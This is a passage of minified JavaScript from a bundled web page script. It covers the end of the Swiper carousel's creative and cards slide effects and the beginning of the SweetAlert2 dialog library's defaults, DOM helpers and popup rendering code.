                },
                next: {
                    translate: [0, 0, 0],
                    rotate: [0, 0, 0],
                    opacity: 1,
                    scale: 1
                }
            }
        });
        const n = e => "string" == typeof e ? e : `${e}px`;
        te({
            effect: "creative",
            swiper: t,
            on: a,
            setTranslate: () => {
                const {
                    slides: e,
                    $wrapperEl: s,
                    slidesSizesGrid: a
                } = t, r = t.params.creativeEffect, {
                    progressMultiplier: o
                } = r, i = t.params.centeredSlides;
                if (i) {
                    const e = a[0] / 2 - t.params.slidesOffsetBefore || 0;
                    s.transform(`translateX(calc(50% - ${e}px))`)
                }
                for (let s = 0; s < e.length; s += 1) {
                    const a = e.eq(s),
                        l = a[0].progress,
                        c = Math.min(Math.max(a[0].progress, -r.limitProgress), r.limitProgress);
                    let d = c;
                    i || (d = Math.min(Math.max(a[0].originalProgress, -r.limitProgress), r.limitProgress));
                    const u = a[0].swiperSlideOffset,
                        p = [t.params.cssMode ? -u - t.translate : -u, 0, 0],
                        m = [0, 0, 0];
                    let f = !1;
                    t.isHorizontal() || (p[1] = p[0], p[0] = 0);
                    let h = {
                        translate: [0, 0, 0],
                        rotate: [0, 0, 0],
                        scale: 1,
                        opacity: 1
                    };
                    c < 0 ? (h = r.next, f = !0) : c > 0 && (h = r.prev, f = !0), p.forEach(((e, t) => {
                        p[t] = `calc(${e}px + (${n(h.translate[t])} * ${Math.abs(c*o)}))`
                    })), m.forEach(((e, t) => {
                        m[t] = h.rotate[t] * Math.abs(c * o)
                    })), a[0].style.zIndex = -Math.abs(Math.round(l)) + e.length;
                    const g = p.join(", "),
                        y = `rotateX(${m[0]}deg) rotateY(${m[1]}deg) rotateZ(${m[2]}deg)`,
                        v = d < 0 ? `scale(${1+(1-h.scale)*d*o})` : `scale(${1-(1-h.scale)*d*o})`,
                        b = d < 0 ? 1 + (1 - h.opacity) * d * o : 1 - (1 - h.opacity) * d * o,
                        w = `translate3d(${g}) ${y} ${v}`;
                    if (f && h.shadow || !f) {
                        let e = a.children(".swiper-slide-shadow");
                        if (0 === e.length && h.shadow && (e = ne(r, a)), e.length) {
                            const t = r.shadowPerProgress ? c * (1 / r.limitProgress) : c;
                            e[0].style.opacity = Math.min(Math.max(Math.abs(t), 0), 1)
                        }
                    }
                    const C = se(r, a);
                    C.transform(w).css({
                        opacity: b
                    }), h.origin && C.css("transform-origin", h.origin)
                }
            },
            setTransition: e => {
                const {
                    transformEl: s
                } = t.params.creativeEffect;
                (s ? t.slides.find(s) : t.slides).transition(e).find(".swiper-slide-shadow").transition(e), ae({
                    swiper: t,
                    duration: e,
                    transformEl: s,
                    allSlides: !0
                })
            },
            perspective: () => t.params.creativeEffect.perspective,
            overwriteParams: () => ({
                watchSlidesProgress: !0,
                virtualTranslate: !t.params.cssMode
            })
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a
        } = e;
        s({
            cardsEffect: {
                slideShadows: !0,
                transformEl: null,
                rotate: !0,
                perSlideRotate: 2,
                perSlideOffset: 8
            }
        }), te({
            effect: "cards",
            swiper: t,
            on: a,
            setTranslate: () => {
                const {
                    slides: e,
                    activeIndex: s
                } = t, a = t.params.cardsEffect, {
                    startTranslate: n,
                    isTouched: r
                } = t.touchEventsData, o = t.translate;
                for (let i = 0; i < e.length; i += 1) {
                    const l = e.eq(i),
                        c = l[0].progress,
                        d = Math.min(Math.max(c, -4), 4);
                    let u = l[0].swiperSlideOffset;
                    t.params.centeredSlides && !t.params.cssMode && t.$wrapperEl.transform(`translateX(${t.minTranslate()}px)`), t.params.centeredSlides && t.params.cssMode && (u -= e[0].swiperSlideOffset);
                    let p = t.params.cssMode ? -u - t.translate : -u,
                        m = 0;
                    const f = -100 * Math.abs(d);
                    let h = 1,
                        g = -a.perSlideRotate * d,
                        y = a.perSlideOffset - .75 * Math.abs(d);
                    const v = t.virtual && t.params.virtual.enabled ? t.virtual.from + i : i,
                        b = (v === s || v === s - 1) && d > 0 && d < 1 && (r || t.params.cssMode) && o < n,
                        w = (v === s || v === s + 1) && d < 0 && d > -1 && (r || t.params.cssMode) && o > n;
                    if (b || w) {
                        const e = (1 - Math.abs((Math.abs(d) - .5) / .5)) ** .5;
                        g += -28 * d * e, h += -.5 * e, y += 96 * e, m = -25 * e * Math.abs(d) + "%"
                    }
                    if (p = d < 0 ? `calc(${p}px + (${y*Math.abs(d)}%))` : d > 0 ? `calc(${p}px + (-${y*Math.abs(d)}%))` : `${p}px`, !t.isHorizontal()) {
                        const e = m;
                        m = p, p = e
                    }
                    const C = d < 0 ? "" + (1 + (1 - h) * d) : "" + (1 - (1 - h) * d),
                        E = `\n        translate3d(${p}, ${m}, ${f}px)\n        rotateZ(${a.rotate?g:0}deg)\n        scale(${C})\n      `;
                    if (a.slideShadows) {
                        let e = l.find(".swiper-slide-shadow");
                        0 === e.length && (e = ne(a, l)), e.length && (e[0].style.opacity = Math.min(Math.max((Math.abs(d) - .5) / .5, 0), 1))
                    }
                    l[0].style.zIndex = -Math.abs(Math.round(c)) + e.length, se(a, l).transform(E)
                }
            },
            setTransition: e => {
                const {
                    transformEl: s
                } = t.params.cardsEffect;
                (s ? t.slides.find(s) : t.slides).transition(e).find(".swiper-slide-shadow").transition(e), ae({
                    swiper: t,
                    duration: e,
                    transformEl: s
                })
            },
            perspective: () => !0,
            overwriteParams: () => ({
                watchSlidesProgress: !0,
                virtualTranslate: !t.params.cssMode
            })
        })
    }];
    return J.use(re), J
})),
function(e, t) {
    "object" == typeof exports && "undefined" != typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define(t) : (e = e || self).Sweetalert2 = t()
}(this, (function() {
    "use strict";
    const e = "SweetAlert2:",
        t = e => e.charAt(0).toUpperCase() + e.slice(1),
        s = e => Array.prototype.slice.call(e),
        a = t => {
            console.warn("".concat(e, " ").concat("object" == typeof t ? t.join(" ") : t))
        },
        n = t => {
            console.error("".concat(e, " ").concat(t))
        },
        r = [],
        o = (e, t) => {
            e = '"'.concat(e, '" is deprecated and will be removed in the next major release. Please use "').concat(t, '" instead.'), r.includes(e) || (r.push(e), a(e))
        },
        i = e => "function" == typeof e ? e() : e,
        l = e => e && "function" == typeof e.toPromise,
        c = e => l(e) ? e.toPromise() : Promise.resolve(e),
        d = e => e && Promise.resolve(e) === e,
        u = {
            title: "",
            titleText: "",
            text: "",
            html: "",
            footer: "",
            icon: void 0,
            iconColor: void 0,
            iconHtml: void 0,
            template: void 0,
            toast: !1,
            showClass: {
                popup: "swal2-show",
                backdrop: "swal2-backdrop-show",
                icon: "swal2-icon-show"
            },
            hideClass: {
                popup: "swal2-hide",
                backdrop: "swal2-backdrop-hide",
                icon: "swal2-icon-hide"
            },
            customClass: {},
            target: "body",
            color: void 0,
            backdrop: !0,
            heightAuto: !0,
            allowOutsideClick: !0,
            allowEscapeKey: !0,
            allowEnterKey: !0,
            stopKeydownPropagation: !0,
            keydownListenerCapture: !1,
            showConfirmButton: !0,
            showDenyButton: !1,
            showCancelButton: !1,
            preConfirm: void 0,
            preDeny: void 0,
            confirmButtonText: "OK",
            confirmButtonAriaLabel: "",
            confirmButtonColor: void 0,
            denyButtonText: "No",
            denyButtonAriaLabel: "",
            denyButtonColor: void 0,
            cancelButtonText: "Cancel",
            cancelButtonAriaLabel: "",
            cancelButtonColor: void 0,
            buttonsStyling: !0,
            reverseButtons: !1,
            focusConfirm: !0,
            focusDeny: !1,
            focusCancel: !1,
            returnFocus: !0,
            showCloseButton: !1,
            closeButtonHtml: "&times;",
            closeButtonAriaLabel: "Close this dialog",
            loaderHtml: "",
            showLoaderOnConfirm: !1,
            showLoaderOnDeny: !1,
            imageUrl: void 0,
            imageWidth: void 0,
            imageHeight: void 0,
            imageAlt: "",
            timer: void 0,
            timerProgressBar: !1,
            width: void 0,
            padding: void 0,
            background: void 0,
            input: void 0,
            inputPlaceholder: "",
            inputLabel: "",
            inputValue: "",
            inputOptions: {},
            inputAutoTrim: !0,
            inputAttributes: {},
            inputValidator: void 0,
            returnInputValueOnDeny: !1,
            validationMessage: void 0,
            grow: !1,
            position: "center",
            progressSteps: [],
            currentProgressStep: void 0,
            progressStepsDistance: void 0,
            willOpen: void 0,
            didOpen: void 0,
            didRender: void 0,
            willClose: void 0,
            didClose: void 0,
            didDestroy: void 0,
            scrollbarPadding: !0
        },
        p = ["allowEscapeKey", "allowOutsideClick", "background", "buttonsStyling", "cancelButtonAriaLabel", "cancelButtonColor", "cancelButtonText", "closeButtonAriaLabel", "closeButtonHtml", "color", "confirmButtonAriaLabel", "confirmButtonColor", "confirmButtonText", "currentProgressStep", "customClass", "denyButtonAriaLabel", "denyButtonColor", "denyButtonText", "didClose", "didDestroy", "footer", "hideClass", "html", "icon", "iconColor", "iconHtml", "imageAlt", "imageHeight", "imageUrl", "imageWidth", "preConfirm", "preDeny", "progressSteps", "returnFocus", "reverseButtons", "showCancelButton", "showCloseButton", "showConfirmButton", "showDenyButton", "text", "title", "titleText", "willClose"],
        m = {},
        f = ["allowOutsideClick", "allowEnterKey", "backdrop", "focusConfirm", "focusDeny", "focusCancel", "returnFocus", "heightAuto", "keydownListenerCapture"],
        h = e => Object.prototype.hasOwnProperty.call(u, e),
        g = e => -1 !== p.indexOf(e),
        y = e => m[e];
    var v = e => {
        const t = {};
        for (const s in e) t[e[s]] = "swal2-" + e[s];
        return t
    };
    const b = v(["container", "shown", "height-auto", "iosfix", "popup", "modal", "no-backdrop", "no-transition", "toast", "toast-shown", "show", "hide", "close", "title", "html-container", "actions", "confirm", "deny", "cancel", "default-outline", "footer", "icon", "icon-content", "image", "input", "file", "range", "select", "radio", "checkbox", "label", "textarea", "inputerror", "input-label", "validation-message", "progress-steps", "active-progress-step", "progress-step", "progress-step-line", "loader", "loading", "styled", "top", "top-start", "top-end", "top-left", "top-right", "center", "center-start", "center-end", "center-left", "center-right", "bottom", "bottom-start", "bottom-end", "bottom-left", "bottom-right", "grow-row", "grow-column", "grow-fullscreen", "rtl", "timer-progress-bar", "timer-progress-bar-container", "scrollbar-measure", "icon-success", "icon-warning", "icon-info", "icon-question", "icon-error"]),
        w = v(["success", "warning", "info", "question", "error"]),
        C = () => document.body.querySelector(".".concat(b.container)),
        E = e => {
            const t = C();
            return t ? t.querySelector(e) : null
        },
        _ = e => E(".".concat(e)),
        L = () => _(b.popup),
        B = () => _(b.icon),
        N = () => _(b.title),
        T = () => _(b["html-container"]),
        x = () => _(b.image),
        S = () => _(b["progress-steps"]),
        A = () => _(b["validation-message"]),
        k = () => E(".".concat(b.actions, " .").concat(b.confirm)),
        M = () => E(".".concat(b.actions, " .").concat(b.deny)),
        I = () => E(".".concat(b.loader)),
        P = () => E(".".concat(b.actions, " .").concat(b.cancel)),
        D = () => _(b.actions),
        H = () => _(b.footer),
        O = () => _(b["timer-progress-bar"]),
        $ = () => _(b.close),
        R = () => {
            const e = s(L().querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])')).sort(((e, t) => (e = parseInt(e.getAttribute("tabindex")), (t = parseInt(t.getAttribute("tabindex"))) < e ? 1 : e < t ? -1 : 0)));
            var t = s(L().querySelectorAll('\n  a[href],\n  area[href],\n  input:not([disabled]),\n  select:not([disabled]),\n  textarea:not([disabled]),\n  button:not([disabled]),\n  iframe,\n  object,\n  embed,\n  [tabindex="0"],\n  [contenteditable],\n  audio[controls],\n  video[controls],\n  summary\n')).filter((e => "-1" !== e.getAttribute("tabindex")));
            return (e => {
                const t = [];
                for (let s = 0; s < e.length; s++) - 1 === t.indexOf(e[s]) && t.push(e[s]);
                return t
            })(e.concat(t)).filter((e => ne(e)))
        },
        G = () => z(document.body, b.shown) && !z(document.body, b["toast-shown"]) && !z(document.body, b["no-backdrop"]),
        j = () => L() && z(L(), b.toast);

    function F(e) {
        var t = 1 < arguments.length && void 0 !== arguments[1] && arguments[1];
        const s = O();
        ne(s) && (t && (s.style.transition = "none", s.style.width = "100%"), setTimeout((() => {
            s.style.transition = "width ".concat(e / 1e3, "s linear"), s.style.width = "0%"
        }), 10))
    }
    const U = {
            previousBodyPadding: null
        },
        q = (e, t) => {
            if (e.textContent = "", t) {
                const a = (new DOMParser).parseFromString(t, "text/html");
                s(a.querySelector("head").childNodes).forEach((t => {
                    e.appendChild(t)
                })), s(a.querySelector("body").childNodes).forEach((t => {
                    e.appendChild(t)
                }))
            }
        },
        z = (e, t) => {
            if (!t) return !1;
            var s = t.split(/\s+/);
            for (let t = 0; t < s.length; t++)
                if (!e.classList.contains(s[t])) return !1;
            return !0
        },
        Y = (e, t, n) => {
            if (((e, t) => {
                    s(e.classList).forEach((s => {
                        Object.values(b).includes(s) || Object.values(w).includes(s) || Object.values(t.showClass).includes(s) || e.classList.remove(s)
                    }))
                })(e, t), t.customClass && t.customClass[n]) {
                if ("string" != typeof t.customClass[n] && !t.customClass[n].forEach) return a("Invalid type of customClass.".concat(n, '! Expected string or iterable object, got "').concat(typeof t.customClass[n], '"'));
                K(e, t.customClass[n])
            }
        },
        J = (e, t) => {
            if (!t) return null;
            switch (t) {
                case "select":
                case "textarea":
                case "file":
                    return e.querySelector(".".concat(b.popup, " > .").concat(b[t]));
                case "checkbox":
                    return e.querySelector(".".concat(b.popup, " > .").concat(b.checkbox, " input"));
                case "radio":
                    return e.querySelector(".".concat(b.popup, " > .").concat(b.radio, " input:checked")) || e.querySelector(".".concat(b.popup, " > .").concat(b.radio, " input:first-child"));
                case "range":
                    return e.querySelector(".".concat(b.popup, " > .").concat(b.range, " input"));
                default:
                    return e.querySelector(".".concat(b.popup, " > .").concat(b.input))
            }
        },
        V = e => {
            var t;
            e.focus(), "file" !== e.type && (t = e.value, e.value = "", e.value = t)
        },
        W = (e, t, s) => {
            e && t && (t = "string" == typeof t ? t.split(/\s+/).filter(Boolean) : t).forEach((t => {
                Array.isArray(e) ? e.forEach((e => {
                    s ? e.classList.add(t) : e.classList.remove(t)
                })) : s ? e.classList.add(t) : e.classList.remove(t)
            }))
        },
        K = (e, t) => {
            W(e, t, !0)
        },
        Z = (e, t) => {
            W(e, t, !1)
        },
        X = (e, t) => {
            var a = s(e.childNodes);
            for (let e = 0; e < a.length; e++)
                if (z(a[e], t)) return a[e]
        },
        Q = (e, t, s) => {
            (s = s === "".concat(parseInt(s)) ? parseInt(s) : s) || 0 === parseInt(s) ? e.style[t] = "number" == typeof s ? "".concat(s, "px") : s : e.style.removeProperty(t)
        },
        ee = function(e) {
            e.style.display = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : "flex"
        },
        te = e => {
            e.style.display = "none"
        },
        se = (e, t, s, a) => {
            const n = e.querySelector(t);
            n && (n.style[s] = a)
        },
        ae = (e, t, s) => {
            t ? ee(e, s) : te(e)
        },
        ne = e => !(!e || !(e.offsetWidth || e.offsetHeight || e.getClientRects().length)),
        re = e => !!(e.scrollHeight > e.clientHeight),
        oe = e => {
            const t = window.getComputedStyle(e);
            e = parseFloat(t.getPropertyValue("animation-duration") || "0");
            var s = parseFloat(t.getPropertyValue("transition-duration") || "0");
            return 0 < e || 0 < s
        },
        ie = () => "undefined" == typeof window || "undefined" == typeof document,
        le = {},
        ce = e => new Promise((t => {
            if (!e) return t();
            var s = window.scrollX,
                a = window.scrollY;
            le.restoreFocusTimeout = setTimeout((() => {
                le.previousActiveElement && le.previousActiveElement.focus ? (le.previousActiveElement.focus(), le.previousActiveElement = null) : document.body && document.body.focus(), t()
            }), 100), window.scrollTo(s, a)
        })),
        de = '\n <div aria-labelledby="'.concat(b.title, '" aria-describedby="').concat(b["html-container"], '" class="').concat(b.popup, '" tabindex="-1">\n   <button type="button" class="').concat(b.close, '"></button>\n   <ul class="').concat(b["progress-steps"], '"></ul>\n   <div class="').concat(b.icon, '"></div>\n   <img loading="lazy" class="').concat(b.image, '" />\n   <h2 class="').concat(b.title, '" id="').concat(b.title, '"></h2>\n   <div class="').concat(b["html-container"], '" id="').concat(b["html-container"], '"></div>\n   <input class="').concat(b.input, '" />\n   <input type="file" class="').concat(b.file, '" />\n   <div class="').concat(b.range, '">\n     <input type="range" />\n     <output></output>\n   </div>\n   <select class="').concat(b.select, '"></select>\n   <div class="').concat(b.radio, '"></div>\n   <label for="').concat(b.checkbox, '" class="').concat(b.checkbox, '">\n     <input type="checkbox" />\n     <span class="').concat(b.label, '"></span>\n   </label>\n   <textarea class="').concat(b.textarea, '"></textarea>\n   <div class="').concat(b["validation-message"], '" id="').concat(b["validation-message"], '"></div>\n   <div class="').concat(b.actions, '">\n     <div class="').concat(b.loader, '"></div>\n     <button type="button" class="').concat(b.confirm, '"></button>\n     <button type="button" class="').concat(b.deny, '"></button>\n     <button type="button" class="').concat(b.cancel, '"></button>\n   </div>\n   <div class="').concat(b.footer, '"></div>\n   <div class="').concat(b["timer-progress-bar-container"], '">\n     <div class="').concat(b["timer-progress-bar"], '"></div>\n   </div>\n </div>\n').replace(/(^|\n)\s*/g, ""),
        ue = () => {
            le.currentInstance.resetValidationMessage()
        },
        pe = (e, t) => {
            if (e instanceof HTMLElement) t.appendChild(e);
            else if ("object" == typeof e) {
                var s = e,
                    a = t;
                s.jquery ? me(a, s) : q(a, s.toString())
            } else e && q(t, e)
        },
        me = (e, t) => {
            if (e.textContent = "", 0 in t)
                for (let s = 0; s in t; s++) e.appendChild(t[s].cloneNode(!0));
            else e.appendChild(t.cloneNode(!0))
        },
        fe = (() => {
            if (ie()) return !1;
            var e = document.createElement("div"),
                t = {
                    WebkitAnimation: "webkitAnimationEnd",
                    animation: "animationend"
                };
            for (const s in t)
                if (Object.prototype.hasOwnProperty.call(t, s) && void 0 !== e.style[s]) return t[s];
            return !1
        })();

    function he(e, s, a) {
        ae(e, a["show".concat(t(s), "Button")], "inline-block"), q(e, a["".concat(s, "ButtonText")]), e.setAttribute("aria-label", a["".concat(s, "ButtonAriaLabel")]), e.className = b[s], Y(e, a, "".concat(s, "Button")), K(e, a["".concat(s, "ButtonClass")])
    }
    var ge = {
        awaitingPromise: new WeakMap,
        promise: new WeakMap,
        innerParams: new WeakMap,
        domCache: new WeakMap
    };
    const ye = ["input", "file", "range", "select", "radio", "checkbox", "textarea"],
        ve = e => {
            for (let s = 0; s < e.attributes.length; s++) {
                var t = e.attributes[s].name;
                ["type", "value", "style"].includes(t) || e.removeAttribute(t)
            }
        },
        be = (e, t) => {
            e.placeholder && !t.inputPlaceholder || (e.placeholder = t.inputPlaceholder)
        },
        we = (e, t, s) => {
            if (s.inputLabel) {
                e.id = b.input;
                const n = document.createElement("label");
                var a = b["input-label"];
                n.setAttribute("for", e.id), n.className = a, K(n, s.customClass.inputLabel), n.innerText = s.inputLabel, t.insertAdjacentElement("beforebegin", n)
            }
        },
        Ce = e => (e = b[e] || b.input, X(L(), e)),
        Ee = {},
        _e = (Ee.text = Ee.email = Ee.password = Ee.number = Ee.tel = Ee.url = (e, t) => ("string" == typeof t.inputValue || "number" == typeof t.inputValue ? e.value = t.inputValue : d(t.inputValue) || a('Unexpected type of inputValue! Expected "string", "number" or "Promise", got "'.concat(typeof t.inputValue, '"')), we(e, e, t), be(e, t), e.type = t.input, e), Ee.file = (e, t) => (we(e, e, t), be(e, t), e), Ee.range = (e, t) => {
            const s = e.querySelector("input"),
                a = e.querySelector("output");
            return s.value = t.inputValue, s.type = t.input, a.value = t.inputValue, we(s, e, t), e
        }, Ee.select = (e, t) => {
            if (e.textContent = "", t.inputPlaceholder) {
                const s = document.createElement("option");
                q(s, t.inputPlaceholder), s.value = "", s.disabled = !0, s.selected = !0, e.appendChild(s)
            }
            return we(e, e, t), e
        }, Ee.radio = e => (e.textContent = "", e), Ee.checkbox = (e, t) => {
            const s = J(L(), "checkbox");
            s.value = "1", s.id = b.checkbox, s.checked = Boolean(t.inputValue);
            var a = e.querySelector("span");
            return q(a, t.inputPlaceholder), e
        }, Ee.textarea = (e, t) => (e.value = t.inputValue, be(e, t), we(e, e, t), setTimeout((() => {
            if ("MutationObserver" in window) {
                const t = parseInt(window.getComputedStyle(L()).width);
                new MutationObserver((() => {
                    var s = e.offsetWidth + (s = e, parseInt(window.getComputedStyle(s).marginLeft) + parseInt(window.getComputedStyle(s).marginRight));
                    L().style.width = s > t ? "".concat(s, "px") : null
                })).observe(e, {
                    attributes: !0,
                    attributeFilter: ["style"]
                })
            }
        })), e), (e, t) => {
            const s = T();
            Y(s, t, "htmlContainer"), t.html ? (pe(t.html, s), ee(s, "block")) : t.text ? (s.textContent = t.text, ee(s, "block")) : te(s), ((e, t) => {
                const s = L();
                var a;
                const r = !(e = ge.innerParams.get(e)) || t.input !== e.input;
                ye.forEach((e => {
                    var a = b[e];
                    const n = X(s, a);
                    {
                        var o = t.inputAttributes;
                        const s = J(L(), e);
                        if (s) {
                            ve(s);
                            for (const e in o) s.setAttribute(e, o[e])
                        }
                    }
                    n.className = a, r && te(n)
                })), t.input && (r && (e => {
                    if (!Ee[e.input]) return n('Unexpected type of input! Expected "text", "email", "password", "number", "tel", "select", "radio", "checkbox", "textarea", "file" or "url", got "'.concat(e.input, '"'));
                    const t = Ce(e.input),
                        s = Ee[e.input](t, e);
                    ee(s), setTimeout((() => {
                        V(s)
                    }))
                })(t), a = Ce((e = t).input), e.customClass && K(a, e.customClass.input))
            })(e, t)
        }),
        Le = (e, t) => {
            for (const s in w) t.icon !== s && Z(e, w[s]);
            K(e, w[t.icon]), Te(e, t), Be(), Y(e, t, "icon")
        },
        Be = () => {
            const e = L();
            var t = window.getComputedStyle(e).getPropertyValue("background-color");
            const s = e.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
            for (let e = 0; e < s.length; e++) s[e].style.backgroundColor = t
        },
        Ne = (e, t) => {
            e.textContent = "", t.iconHtml ? q(e, xe(t.iconHtml)) : "success" === t.icon ? q(e, '\n  <div class="swal2-success-circular-line-left"></div>\n  <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>\n  <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>\n  <div class="swal2-success-circular-line-right"></div>\n') : "error" === t.icon ? q(e, '\n  <span class="swal2-x-mark">\n    <span class="swal2-x-mark-line-left"></span>\n    <span class="swal2-x-mark-line-right"></span>\n  </span>\n') : q(e, xe({
                question: "?",
                warning: "!",
                info: "i"
            } [t.icon]))
        },
        Te = (e, t) => {
            if (t.iconColor) {
                e.style.color = t.iconColor, e.style.borderColor = t.iconColor;
                for (const s of [".swal2-success-line-tip", ".swal2-success-line-long", ".swal2-x-mark-line-left", ".swal2-x-mark-line-right"]) se(e, s, "backgroundColor", t.iconColor);
                se(e, ".swal2-success-ring", "borderColor", t.iconColor)
            }
        },
        xe = e => '<div class="'.concat(b["icon-content"], '">').concat(e, "</div>"),
        Se = (e, t) => {
            ((e, t) => {
                var s = C();
                const a = L();
                t.toast ? (Q(s, "width", t.width), a.style.width = "100%", a.insertBefore(I(), B())) : Q(a, "width", t.width), Q(a, "padding", t.padding), t.color && (a.style.color = t.color), t.background && (a.style.background = t.background), te(A()), (s = a).className = "".concat(b.popup, " ").concat(ne(s) ? t.showClass.popup : ""), t.toast ? (K([document.documentElement, document.body], b["toast-shown"]), K(s, b.toast)) : K(s, b.modal), Y(s, t, "popup"), "string" == typeof t.customClass && K(s, t.customClass), t.icon && K(s, b["icon-".concat(t.icon)])
            })(0, t), ((e, t) => {
                var s, n, r = C();
                r && (n = r, "string" == typeof(s = t.backdrop) ? n.style.background = s : s || K([document.documentElement, document.body], b["no-backdrop"]), n = r, (s = t.position) in b ? K(n, b[s]) : (a('The "position" parameter is not valid, defaulting to "center"'), K(n, b.center)), s = r, (n = t.grow) && "string" == typeof n && (n = "grow-".concat(n)) in b && K(s, b[n]), Y(r, t, "container"))
            })(0, t), ((e, t) => {
                const s = S();
                if (!t.progressSteps || 0 === t.progressSteps.length) return te(s);
                ee(s), s.textContent = "", t.currentProgressStep >= t.progressSteps.length && a("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)"), t.progressSteps.forEach(((e, a) => {
                    var n;
                    n = document.createElement("li"), K(n, b["progress-step"]), q(n, e), e = n, s.appendChild(e), a === t.currentProgressStep && K(e, b["active-progress-step"]), a !== t.progressSteps.length - 1 && (n = (e => {
                        const t = document.createElement("li");
                        return K(t, b["progress-step-line"]), e.progressStepsDistance && (t.style.width = e.progressStepsDistance), t
                    })(t), s.appendChild(n))
                }))
            })(0, t), ((e, t) => {
                e = ge.innerParams.get(e);
                var s = B();
                e && t.icon === e.icon ? (Ne(s, t), Le(s, t)) : t.icon || t.iconHtml ? t.icon && -1 === Object.keys(w).indexOf(t.icon) ? (n('Unknown icon! Expected "success", "error", "warning", "info" or "question", got "'.concat(t.icon, '"')), te(s)) : (ee(s), Ne(s, t), Le(s, t), K(s, t.showClass.icon)) : te(s)
            })(e, t), ((e, t) => {
                const s = x();
                if (!t.imageUrl) return te(s);
                ee(s, ""), s.setAttribute("src", t.imageUrl), s.setAttribute("alt", t.imageAlt), Q(s, "width", t.imageWidth), Q(s, "height", t.imageHeight), s.className = b.image, Y(s, t, "image")
            })(0, t), ((e, t) => {
                const s = N();
                ae(s, t.title || t.titleText, "block"), t.title && pe(t.title, s), t.titleText && (s.innerText = t.titleText), Y(s, t, "title")
            })(0, t), ((e, t) => {
                const s = $();
                q(s, t.closeButtonHtml), Y(s, t, "closeButton"), ae(s, t.showCloseButton), s.setAttribute("aria-label", t.closeButtonAriaLabel)
            })(0, t), _e(e, t), ((e, t) => {
                var s, a, n, r, o, i = D(),
                    l = I();
                (t.showConfirmButton || t.showDenyButton || t.showCancelButton ? ee : te)(i), Y(i, t, "actions"), s = l, a = t, n = k(), r = M(), o = P(), he(n, "confirm", a), he(r, "deny", a), he(o, "cancel", a),
                    function(e, t, s, a) {
                        if (!a.buttonsStyling) return Z([e, t, s], b.styled);
                        K([e, t, s], b.styled), a.confirmButtonColor && (e.style.backgroundColor = a.confirmButtonColor, K(e, b["default-outline"])), a.denyButtonColor && (t.style.backgroundColor = a.denyButtonColor, K(t, b["default-outline"])), a.cancelButtonColor && (s.style.backgroundColor = a.cancelButtonColor, K(s, b["default-outline"]))
                    }(n, r, o, a), a.reverseButtons && (a.toast ? (i.insertBefore(o, n), i.insertBefore(r, n)) : (i.insertBefore(o, s), i.insertBefore(r, s), i.insertBefore(n, s))), q(l, t.loaderHtml), Y(l, t, "loader")
            })(0, t), ((e, t) => {
                var s = H();
                ae(s, t.footer), t.footer && pe(t.footer, s), Y(s, t, "footer")
            })(0, t), "function" == typeof t.didRender && t.didRender(L())
        },
        Ae = Object.freeze({
            cancel: "cancel",
            backdrop: "backdrop",
            close: "close",
            esc: "esc",
            timer: "timer"
        }),
        ke = () => {
            s(document.body.children).forEach((e => {
                e === C() || e.contains(C()) || (e.hasAttribute("aria-hidden") && e.setAttribute("data-previous-aria-hidden", e.getAttribute("aria-hidden")), e.setAttribute("aria-hidden", "true"))
            }))
        },
        Me = () => {
            s(document.body.children).forEach((e => {
                e.hasAttribute("data-previous-aria-hidden") ? (e.setAttribute("aria-hidden", e.getAttribute("data-previous-aria-hidden")), e.removeAttribute("data-previous-aria-hidden")) : e.removeAttribute("aria-hidden")
            }))
        },
        Ie = ["swal-title", "swal-html", "swal-footer"],
        Pe = (e, t) => {
            s(e.attributes).forEach((s => {
                -1 === t.indexOf(s.name) && a(['Unrecognized attribute "'.concat(s.name, '" on <').concat(e.tagName.toLowerCase(), ">."), "".concat(t.length ? "Allowed attributes are: ".concat(t.join(", ")) : "To set the value, use HTML within the element.")])
            }))
        };
    var De = {
        email: (e, t) => /^[a-zA-Z0-9.+_-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]{2,24}$/.test(e) ? Promise.resolve() : Promise.resolve(t || "Invalid email address"),
        url: (e, t) => /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(e) ? Promise.resolve() : Promise.resolve(t || "Invalid URL")
    };

    function He(e) {
        (t = e).inputValidator || Object.keys(De).forEach((e => {
            t.input === e && (t.inputValidator = De[e])
        })), e.showLoaderOnConfirm && !e.preConfirm && a("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request"), (s = e).target && ("string" != typeof s.target || document.querySelector(s.target)) && ("string" == typeof s.target || s.target.appendChild) || (a('Target parameter is not valid, defaulting to "body"'), s.target = "body"), "string" == typeof e.title && (e.title = e.title.split("\n").join("<br />"));
        var t, s = e;
        e = (() => {
            const e = C();
            return !!e && (e.remove(), Z([document.documentElement, document.body], [b["no-backdrop"], b["toast-shown"], b["has-column"]]), !0)
        })();
        if (ie()) n("SweetAlert2 requires document to initialize");
        else {
            const t = document.createElement("div"),
                a = (t.className = b.container, e && K(t, b["no-transition"]), q(t, de), (e => "string" == typeof e ? document.querySelector(e) : e)(s.target));
            a.appendChild(t), (e => {
                const t = L();
                t.setAttribute("role", e.toast ? "alert" : "dialog"), t.setAttribute("aria-live", e.toast ? "polite" : "assertive"), e.toast || t.setAttribute("aria-modal", "true")
            })(s), (e => {
                "rtl" === window.getComputedStyle(e).direction && K(C(), b.rtl)
            })(a), (() => {
                const e = L(),
                    t = X(e, b.input),
                    s = X(e, b.file),
                    a = e.querySelector(".".concat(b.range, " input")),
                    n = e.querySelector(".".concat(b.range, " output")),
                    r = X(e, b.select),
                    o = e.querySelector(".".concat(b.checkbox, " input")),
                    i = X(e, b.textarea);
                t.oninput = ue, s.onchange = ue, r.onchange = ue, o.onchange = ue, i.oninput = ue, a.oninput = () => {
                    ue(), n.value = a.value
                }, a.onchange = () => {
                    ue(), a.nextSibling.value = a.value
                }
            })()
        }
    }
    class Oe {
        constructor(e, t) {
